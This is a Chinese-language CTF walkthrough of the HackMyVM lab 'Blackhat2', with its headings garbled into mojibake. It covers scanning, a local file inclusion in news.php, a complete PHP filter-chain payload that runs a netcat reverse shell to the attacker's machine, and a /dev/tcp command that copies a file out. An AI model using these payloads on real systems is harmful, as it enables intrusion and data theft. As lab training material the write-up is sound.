---
title: Blackhat2
author: hgbe02
date: 2024-05-09
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Blackhat2.html"
---

# Blackhat2

> éå¸¸ä¸é”™çš„ä¸€ä¸ªé¶æœºÊ•â€¢Ì«Í¡â€¢ Ê”â€¢Ì«Í¡â€¢à½»Ê•â€¢Ì«Í¡â€¢Ê”â€¢Í“Í¡â€¢Ê”

![image-20240502153936517](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824573.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824575.png" alt="image-20240502154127744" style="zoom:50%;" />

## ä¿¡æ¯æœé›†

### ç«¯å£æ‰«æ

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/blackhat2]
â””â”€$ rustscan -a 192.168.0.125 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time âŒ›

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.0.125:22
Open 192.168.0.125:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 04:2a:cb:c4:54:0e:de:54:a1:f2:61:d7:6a:29:f6:5f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBUIyR90zqbTcOv6QWBqWJd9VdbWlQGf7cvk2FHPkzLIcHPHFn07VAZ3uxnFKlIDFytteuJ2qtVlhmK5TMnBxxg=
|   256 a8:02:05:f3:a6:61:7d:e8:8b:e5:6f:1c:5b:7b:5b:33 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMN5dOXWLsMESN+NWjIo49NYaAJl8lCuoiTtA8zxqdSF
80/tcp open  http    syn-ack Apache httpd 2.4.57 ((Debian))
|_http-title: Home - Hacked By sML
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.57 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### ç›®å½•æ‰«æ

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/blackhat2]
â””â”€$ gobuster dir -u http://192.168.0.125/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,bak,jpg,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.125/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              bak,jpg,txt,html,php,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/news.php             (Status: 200) [Size: 3418]
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 996]
/index.php            (Status: 200) [Size: 996]
/dp.jpg               (Status: 200) [Size: 238753]
/2021                 (Status: 200) [Size: 31875]
/2022                 (Status: 200) [Size: 34213]
/2023                 (Status: 200) [Size: 36067]
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished
===============================================================
```

## æ¼æ´å‘ç°

### è¸©ç‚¹

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824577.png" alt="image-20240502154246470" style="zoom:50%;" />

### æ•æ„Ÿç›®å½•

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824578.png" alt="image-20240502154347503" style="zoom:50%;" />

```apl
http://192.168.0.125/dp.jpg
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824579.png" alt="image-20240502154408225" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824580.png" alt="image-20240502154451142" style="zoom:50%;" />

è¿˜æœ‰å¾ˆå¤šï¼Œä½†æ˜¯æš‚æ—¶æ²¡å•¥ç”¨ï¼š

### fuzz

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/blackhat2]
â””â”€$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u 'http://192.168.0.125/news.php?FUZZ=../../../../../../'  -fw 1401

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.125/news.php?FUZZ=../../../../../../
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1401
________________________________________________

email                   [Status: 200, Size: 3927, Words: 1571, Lines: 150, Duration: 2ms]
:: Progress: [26584/26584] :: Job [1/1] :: 2564 req/sec :: Duration: [0:00:08] :: Errors: 2 ::
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824581.png" alt="image-20240502154721001" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824582.png" alt="image-20240502154731137" style="zoom:50%;" />

å°è¯•ä¸€ä¸‹LFIæ¼æ´ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824583.png" alt="image-20240502154754175" style="zoom:50%;" />

è¿›ä¸€æ­¥å°è¯•ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824584.png" alt="image-20240502154839362" style="zoom:50%;" />

### php filteré“¾

```bash
http://192.168.0.125/news.php?year=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=nc -e /bin/bash 192.168.0.143 1234
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824585.png" alt="image-20240502155012835" style="zoom:67%;" />

## ææƒ

### ä¿¡æ¯æœé›†

```bash
(remote) www-data@blackhat2.hmv:/var/www/html$ ls -la
total 852
drwxr-xr-x 2 root root   4096 Feb 26 10:19 .
drwxr-xr-x 4 root root   4096 Feb 26 10:19 ..
-rw-r--r-- 1 root root  31875 Feb 26 10:19 2021
-rw-r--r-- 1 root root  34213 Feb 26 10:19 2022
-rw-r--r-- 1 root root  36067 Feb 26 10:19 2023
-rw-r--r-- 1 root root 238753 Feb 26 10:19 dp.jpg
-rw-r--r-- 1 root root   4658 Feb 26 10:19 full-stack-apache-setup.xml
-rw-r--r-- 1 root root 485364 Feb 26 10:19 hacker.webp
-rw-r--r-- 1 root root    996 Feb 26 10:19 index.html
-rw-r--r-- 1 root root    996 Feb 26 10:19 index.php
-rw-r--r-- 1 root root   4560 Feb 26 10:19 news.php
-rw-r--r-- 1 root root   2332 Feb 26 10:19 style.css
(remote) www-data@blackhat2.hmv:/var/www/html$ head hacker.webp 
RIFFï¿½gWEBPVP8 
_ï¿½+
   ï¿½*>1ï¿½Bï¿½!! ï¿½/ï¿½ï¿½fwa?ï¿½ï¿½yï¿½Aï¿½ï¿½ï¿½,ï¿½7ï¿½ï¿½ï¿½%ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½]ï¿½ï¿½ï¿½
                                              ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½wï¿½ï¿½ï¿½ï¿½Tï¿½aï¿½ï¿½Ä‡ï¿½mï¿½ï¿½ï¿½\~_ï¿½ï¿½ï¿½#ï¿½ï¿½3ï¿½+Û³ï¿½}@?ï¿½ï¿½cï¿½`>ï¿½ï¿½`~ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½_ï¿½/ï¿½_ï¿½ï¿½ï¿½|~ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Eï¿½ï¿½~Zuï¿½ï¿½>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½|ï¿½qï¿½^|ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½vï¿½ï¿½oï¿½~ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½(}ï¿½ï¿½
ï¿½ï¿½ï¿½oï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Wï¿½ï¿½ï¿½ï¿½ï¿½ï¿½h~ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½+ï¿½ï¿½ï¿½?ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½?ï¿½ï¿½ï¿½~Xrï¿½_ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½uï¿½ï¿½ï¿½Mï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½?     ï¿½ï¿½?ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
                                                                                                 ï¿½ï¿½ï¿½cï¿½ï¿½ï¿½ï¿½Ì·ï¿½ï¿½ï¿½ï¿½ï¿½?ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½?ï¿½?ï¿½?ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½?ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½wï¿½Gï¿½ï¿½Üï¿½_ï¿½ï¿½ï¿½ï¿½5ï¿½ï¿½ï¿½ï¿½ï¿½Ü¿gUï¿½3ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½?ï¿½~ï¿½ï¿½ï¿½ï¿½]ï¿½;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½lï¿½ï¿½ï¿½ï¿½ï¿½?ï¿½?lï¿½vï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½_ï¿½ï¿½ï¿½sï¿½?ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½_ï¿½ï¿½ï¿½ï¿½ï¿½kï¿½Kï¿½ï¿½ï¿½ï¿½?ï¿½oï¿½_ï¿½ï¿½ï¿½?ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½?ï¿½?ï¿½~ï¿½|ï¿½[ï¿½/ï¿½ï¿½ï¿½'ï¿½?Û¯ï¿½/ï¿½?ï¿½ï¿½ï¿½sï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½yï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½_ï¿½?ï¿½ï¿½ï¿½ï¿½ï¿½%ï¿½ï¿½ï¿½gï¿½/ï¿½ï¿½ï¿½ï¿½?ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Oï¿½ï¿½0ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½IKï¿½l@É
                                                                        Cï¿½3ï¿½ï¿½Õ¨Y<Mï¿½cï¿½Wï¿½ï¿½ï¿½yl\Oï¿½ï¿½ï¿½t~ï¿½ï¿½
                                                                                                   ï¿½ï¿½ï¿½ï¿½|%ï¿½ï¿½TÏ¤jï¿½ï¿½ï¿½eï¿½ï¿½ï¿½ØJï¿½`
                                                                                                                        ï¿½kï¿½ï¿½ï¿½56QWï¿½pï¿½ÅŠYï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½s
                                                                                                                                               Ü€ï¿½*Ù«ï¿½>;ï¿½ï¿½ï¿½ï¿½&ï¿½Zï¿½Mï¿½Vvï¿½ï¿½0ï¿½:Zï¿½ï¿½Pï¿½
                         ï¿½Ñ±ï¿½ï¿½f]ï¿½ï¿½?î­šï¿½-ï¿½ï¿½#Pï¿½fs)ï¿½GËï¿½m1$ï¿½Ô ï¿½ï¿½ï¿½ï¿½,Fï¿½<BXï¿½8ï¿½    ï¿½ï¿½ï¿½=lï¿½ï¿½ï¿½ï¿½&ï¿½ï¿½ï¿½<ï¿½Oï¿½sï¿½T\ï¿½!ï¿½i3Iï¿½nOt}ï¿½ï¿½ï¿½Iï¿½ï¿½ï¿½ï¿½"rï¿½fï¿½ï¿½ï¿½Ç¢ï¿½o~ï¿½ï¿½ï¿½$ï¿½vï¿½tï¿½l}ï¿½U?ï¿½|ï¿½T3ï¿½ï¿½rï¿½ï¿½Rï¿½qï¿½'ï¿½wï¿½
F.~ï¿½(ï¿½ï¿½zEï¿½5ï¿½e=vf-D5Tï¿½ï¿½;Eï¿½b:ï¿½Zï¿½_KwQï¿½ï¿½ï¿½eï¿½ï¿½N%?ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½k_^ï¿½ï¿½1yï¿½ï¿½ï¿½     ï¿½ï¿½ï¿½ï¿½z?4ï¿½ï¿½^ï¿½Õ„ï¿½ï¿½ï¿½?b|ï¿½ï¿½Ó”Eï¿½
ï¿½ï¿½g×½rï¿½`%Qï¿½zï¿½ï¿½;ßï¿½ï¿½ï¿½^ï¿½PJï¿½ï¿½v3ï¿½ï¿½Eßœ:Ô¥ï¿½ï¿½ï¿½yA
                                     8]ï¿½ï¿½vGo4ï¿½:ï¿½ï¿½tï¿½ï¿½ï¿½ï¿½^ï¿½ï¿½(ï¿½Y ï¿½ï¿½ï¿½ï¿½ï¿½Vï¿½ï¿½xï¿½&wï¿½2ï¿½rï¿½ï¿½s1^|[]ï¿½ï¿½ï¿½D
                                                                                         Zï¿½ï¿½ï¿½Ò©Hï¿½~ï¿½ï¿½Sé‚ï¿½
G|ï¿½LGmEï¿½ï¿½ï¿½ï¿½ï¿½ï¿½İºï¿½ï¿½g?ï¿½
                   ï¿½<Rcï¿½ï¿½ï¿½+lk6ï¿½iEXï¿½ï¿½Kï¿½>ï¿½ï¿½ï¿½yÑ°ï¿½ï¿½iLï¿½|ï¿½";ï¿½ï¿½Nï¿½ï¿½ï¿½rï¿½ï¿½ï¿½ 1Z>5
ï¿½ï¿½ï¿½ï¿½fï¿½Iï¿½"o{:tï¿½}^ï¿½ï¿½2_ï¿½ï¿½ï¿½ï¿½ï¿½kxï¿½Å¾{ï¿½ï¿½Û‘ï¿½ï¿½]ï¿½+6jï¿½                           ï¿½ï¿½{r
ï¿½*ï¿½Å©}Ä¢ï¿½/ï¿½ï¿½C>ï¿½ï¿½ZKï¿½s;$Óƒï¿½ï¿½)zï¿½`Nvï¿½6ï¿½ï¿½bP
                                 rï¿½U|wï¿½|#zï¿½ï¿½1ï¿½H
ï¿½%ï¿½ï¿½ ï¿½:Sï¿½Ë¯ï¿½42ï¿½RÔºï¿½ß‘ï‘¤ï¿½ï¿½~uï¿½ï¿½,ï¿½ï¿½:ï¿½Ïµlï¿½ï¿½ï¿½ï¿½*6Rï¿½>ï¿½ï¿½ï¿½$ï¿½Fï¿½?×ºï¿½ï¿½ï¿½ 3ï¿½t^Ù‚ï¿½ï¿½Eï¿½Oï¿½dQm[ï¿½ï¿½8Xï¿½ï¿½-ï¿½ï¿½`kZqï¿½4ï¿½ï¿½dJï¿½ï¿½ï¿½j$rï¿½ï¿½tï¿½wï¿½ï¿½*ï¿½ï¿½.ï¿½{ï¿½y
                 ï¿½ï¿½ï¿½&ï¿½ï¿½ï¿½;
Tiï¿½<ï¿½ï¿½ï¿½Rï¿½Dï¿½ï¿½?Nr8GzGï¿½ï¿½6ï¿½ï¿½ï¿½3ï¿½Zï¿½ZHM,Hï¿½ï¿½ï¿½ï¿½*]ï¿½~4ï¿½xï¿½HSï¿½ï¿½Ù»ï¿½&`Ş¾Ì•ï¿½ï¿½Ê¿bsï¿½ï¿½ï¿½ï¿½ï¿½Zc
ï¿½ï¿½`oï¿½Ë¼ï¿½ï¿½<Vï¿½Lï¿½ï¿½aï¿½:]ï¿½Ã•Mï¿½p
ï¿½ï¿½ï¿½Ùµï¿½ï¿½oï¿½Ç³ï¿½Gï¿½wï¿½ï¿½ï¿½ï¿½usPï¿½pï¿½uï¿½mqï¿½_ï¿½ï¿½ï¿½ICWr&ï¿½ï¿½9:ï¿½ï¿½+ï¿½
ï¿½ï¿½Dï¿½ï¿½ß£ï¿½ï¿½;Saï¿½#ARï¿½(q,ï¿½dï¿½#ï¿½so*Cï¿½Bï¿½&ï¿½iHï¿½ï¿½ï¿½Â¯iKï¿½w+ï¿½Ö€ï¿½mİ¸ï¿½ï¿½>Ó»ï¿½4L}zï¿½ï¿½Ü‹ï¿½ï¿½b        ï¿½1      Iï¿½ï¿½ï¿½ï¿½ï¿½Fï¿½ï¿½'pi X_ï¿½ï¿½ï¿½ï¿½ï¿½Uï¿½Xï¿½Eï¿½Şï¿½Iw'ï¿½ï¿½b#,ï¿½ï¿½$ï¿½iï¿½ï¿½ï¿½
                                                             \ï¿½ï¿½ï¿½ï¿½/ï¿½ï¿½ï¿½rï¿½ï¿½\Gï¿½kï¿½ï¿½ï¿½ï¿½ï¿½Fï¿½ï¿½ï¿½ï¿½ï¿½Oï¿½8ï¿½ï¿½Eï¿½ï¿½ï¿½ï¿½Drï¿½ï¿½&ï¿½^*K~yï¿½ï¿½`ï¿½`ï¿½kï¿½ï¿½fï¿½8ï¿½7ï¿½Yï¿½ï¿½ï¿½F/ï¿½ï¿½ï¿½ï¿½^
ï¿½sGï¿½Lh1"ï¿½kdï¿½ï¿½ï¿½ï¿½É©~c@ï¿½ï¿½ï¿½Wï¿½ï¿½ï¿½gï¿½ï¿½,ï¿½tï¿½ï¿½j\ï¿½Aï¿½ï¿½ï¿½Xï¿½LÑ¤ï¿½Û„wDFï¿½ï¿½ï¿½ï¿½Kï¿½=ï¿½ï¿½\ï¿½ï¿½ï¿½w=ï¿½Hï¿½ï¿½Yï¿½ï¿½W2V-ï¿½)ï¿½
           ï¿½ï¿½ï¿½  ï¿½ï¿½ï¿½Ö”ï¿½ï¿½ï¿½ï¿½ï¿½Sgï¿½5*ï¿½:uY
                                 ï¿½Ø«ï¿½ï¿½ï¿½ï¿½<yï¿½ï¿½1<xtï¿½!-yï¿½,"ï¿½a8ï¿½Ò½ï¿½:xfï¿½Ê¸ï¿½cXï¿½ï¿½Uï¿½fï¿½ï¿½EJiï¿½>=ï¿½ï¿½>ï¿½ï¿½ï¿½Pï¿½Pï¿½]ï¿½ï¿½Uï¿½ï¿½ï¿½.ï¿½cï¿½$m0ï¿½ï¿½9gï¿½Kdï¿½~ï¿½ï¿½Qï¿½!ï¿½&ï¿½ï¿½ï¿½ï¿½/ï¿½a.ï¿½ï¿½ï¿½Uï¿½SÚœ
                                                                                                                                        ï¿½H
                                                                                                                                         ï¿½ï¿½ï¿½jï¿½9ï¿½<=M/Ó˜&7Eï¿½#4ï¿½ï¿½      ï¿½Eï¿½Mï©¿5jï¿½ï¿½ŞŒï¿½dWTï¿½ï¿½WnKï¿½Aäƒ‡Ã”qï¿½ï¿½bï¿½ï¿½B_ï¿½ï¿½@ï¿½)Ñ´TJ3ï¿½V0ï¿½"î®¦ï¿½\qï¿½Lï¿½ï¿½ï¿½?ï¿½ï¿½2M0N8ï¿½ï¿½]ï¿½0ï¿½ï¿½kï¿½&ï¿½ï¿½ï¿½ï¿½By?\1ï¿½ï¿½~ï¿½.ï¿½L&ï¿½Ò¹ï¿½qï¿½Fhï¿½vwï¿½ï¿½ aï¿½jfxï¿½ï¿½ï¿½ï¿½ï¿½iï¿½ï¿½ï¿½d$ï¿½ï¿½tï¿½hï¿½ï¿½
ï¿½8ï¿½+ï¿½ï¿½Wï¿½^ï¿½![ï¿½Ş–ï¿½ï¿½ï¿½jï¿½ï¿½ï¿½ï¿½ï¿½ï¿½EPï¿½ï¿½ï¿½wï¿½ï¿½z>Óµzï¿½F@&ï¿½İ² ;Pï¿½`('ï¿½ï¿½ï¿½,ï¿½\ï¿½ï¿½hDï¿½ï¿½rXï¿½ï¿½ï¿½ï¿½Iï¿½"ï¿½ $5ï¿½ï¿½Ô’ï¿½lï¿½ï¿½ï¿½ ï¿½~ï¿½ï¿½Plmï¿½ï¿½_ï¿½ï¿½ï¿½ï¿½ï¿½wW:ï¿½    cp
     ï¿½ï¿½'ï¿½Hï¿½Rï¿½}ï¿½ï¿½:-ï¿½ï¿½ï¿½ï¿½wDï¿½oï¿½ï¿½eï¿½ï¿½ï¿½N:ï¿½ï¿½Dï¿½ï¿½ï¿½mï¿½>_8ï¿½ï¿½Z%3ï¿½Vjï¿½ï¿½jï¿½9ï¿½iï¿½ï¿½}ï¿½vï¿½ï¿½ï¿½/X$4ï¿½ï¿½ï¿½ï¿½^ï¿½3Fï¿½ï¿½
ï¿½zï¿½4jï¿½ï¿½~/ï¿½ï¿½ï¿½_zï¿½Ä·ÅXï¿½ï¿½Ş¢ï¿½ï¿½ï¿½è‘¿Hï¿½Lï¿½ï¿½ï¿½ï¿½qn3ï¿½"Nï¿½
(remote) www-data@blackhat2.hmv:/var/www/html$ sudo -l
bash: sudo: command not found
(remote) www-data@blackhat2.hmv:/var/www/html$ cat /etc/passwd | grep "bash"
root:x:0:0:root:/root:/bin/bash
sml:x:1000:1000:,,,:/home/sml:/bin/bash
(remote) www-data@blackhat2.hmv:/var/www/html$ cd /home
(remote) www-data@blackhat2.hmv:/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Feb 26 10:25 .
drwxr-xr-x 18 root root 4096 Feb 26 09:58 ..
drwx------  3 sml  sml  4096 Feb 26 10:32 sml
(remote) www-data@blackhat2.hmv:/var/www$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/umount
(remote) www-data@blackhat2.hmv:/var/www$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=e
```

å°è¯•ä¼ ä¸€ä¸ªæ•æ„Ÿæ–‡ä»¶è¿‡æ¥ï¼š

```bash
(remote) www-data@blackhat2.hmv:/var/www/html$ ls -la
total 852
drwxr-xr-x 2 root root   4096 Feb 26 10:19 .
drwxr-xr-x 4 root root   4096 Feb 26 10:19 ..
-rw-r--r-- 1 root root  31875 Feb 26 10:19 2021
-rw-r--r-- 1 root root  34213 Feb 26 10:19 2022
-rw-r--r-- 1 root root  36067 Feb 26 10:19 2023
-rw-r--r-- 1 root root 238753 Feb 26 10:19 dp.jpg
-rw-r--r-- 1 root root   4658 Feb 26 10:19 full-stack-apache-setup.xml
-rw-r--r-- 1 root root 485364 Feb 26 10:19 hacker.webp
-rw-r--r-- 1 root root    996 Feb 26 10:19 index.html
-rw-r--r-- 1 root root    996 Feb 26 10:19 index.php
-rw-r--r-- 1 root root   4560 Feb 26 10:19 news.php
-rw-r--r-- 1 root root   2332 Feb 26 10:19 style.css
(remote) www-data@blackhat2.hmv:/var/www/html$ cat hacker.webp > /dev/tcp/192.168.0.143/4444
```

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/blackhat2]
â””â”€$ nc -lvnp 4444 > hacker.webp
listening on [any] 4444 ...
connect to [192.168.0.143] from (UNKNOWN) [192.168.0.125] 59234
```

æœ¬åœ°çœ‹ä¸€ä¸‹ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824586.png" alt="image-20240502155643498" style="zoom:50%;" />

æ— ç”¨åŠŸï¼Ÿï¼Ÿï¼Ÿï¼Ÿ

ä¸Šä¼ `linpeas.sh`å’Œ`pspy64`ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824587.png" alt="image-20240502160105571" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824588.png" alt="image-20240502160126893" style="zoom:50%;" />

ç„¶åè¿è¡Œ`pspy64`ï¼Œçœ‹ä¸€ä¸‹æœ‰äº›å•¥ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824589.png" alt="image-20240502160326852" style="zoom:50%;" />

æ²¡ä¸œè¥¿ï¼Œç»§ç»­æ‰¾ä¸€ä¸‹æ˜¯å¦æœ‰å¯ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯æ²¡å•¥å‘ç°ï¼Œå°è¯•è¿›è¡Œå†…ç½‘æ‰«æï¼Œç›´æ¥ä½¿ç”¨[å¸ˆå‚…çš„](https://conimi.com/archives/118/#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99)äº†!ï¼š
